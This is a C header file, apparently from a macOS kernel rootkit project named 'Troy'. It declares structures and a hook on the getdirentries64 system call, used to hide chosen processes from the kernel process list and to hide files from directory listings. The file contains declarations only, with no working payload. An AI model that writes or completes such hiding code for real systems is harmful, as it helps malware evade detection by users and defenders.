//
//  HookCAPI.h
//  Troy
//
//  Created by Axis on 5/8/15.
//  Copyright (c) 2015 Axis. All rights reserved.
//

#ifndef __Troy__HookCAPI__
#define __Troy__HookCAPI__

#include "configure.h"

#define PROCESS_NAME_LENGTH 100+1

//attention:
//Althrough the struct proc have so many members, but for hiding the process,
//i only need the first memeber. If i get the first memeber, i will walk through
//all the prcess array.
struct	proc_yousemite
{
    LIST_ENTRY(proc_yousemite) p_list;
};

//from https://github.com/rc0r/FileHider/blob/master/FileHider/FileHider.h
struct getdirentries64_args {
    int fd;
    user_addr_t bufp;
    user_size_t bufsize;
    user_addr_t position;
};


struct hide_proc
{
    TAILQ_ENTRY(hide_proc) next_ptr;
    struct proc_yousemite *proc;
    char name[PROCESS_NAME_LENGTH];
    int proc_pid;
};
TAILQ_HEAD(hide_proc_list, hide_proc);

//typedef int (*kill_function_prototype)(proc_t cp, struct kill_args *uap, __unused int32_t *retval);
typedef int (*getdirentries64_function_prototype)(struct proc *p,
                                                  struct getdirentries64_args *uap,
                                                  user_ssize_t *retval);

errno_t hide_given_process(troy_hide_object *process_hide);
int my_getdirentries64_callback(struct proc *p, struct getdirentries64_args *uap, user_ssize_t *retval);

#endif /* defined(__Troy__HookCAPI__) */
